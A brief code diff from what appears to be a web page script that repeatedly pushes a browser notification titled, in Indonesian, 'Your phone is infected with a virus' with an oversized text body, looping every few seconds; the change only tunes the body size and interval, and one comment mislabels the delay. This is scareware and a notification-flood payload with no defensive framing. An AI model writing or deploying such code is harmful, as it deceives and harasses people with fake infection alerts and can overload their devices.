@@ -33,11 +33,11 @@
             async function spamNotif() {
               const bigBody = await createBigText();
               reg.showNotification("Hp Anda Terinfeksi Virus 🚨", {
-                body: bigBody.substring(0, 900000), // max chrome ~10KB notif body
+                body: bigBody.substring(0, 90000), // max chrome ~10KB notif body
                 icon: "https://via.placeholder.com/128",
                 tag: "big-spam"
               });
-              setTimeout(spamNotif, 1000); // 60 detik
+              setTimeout(spamNotif, 10000); // 60 detik
             }
 
             spamNotif();
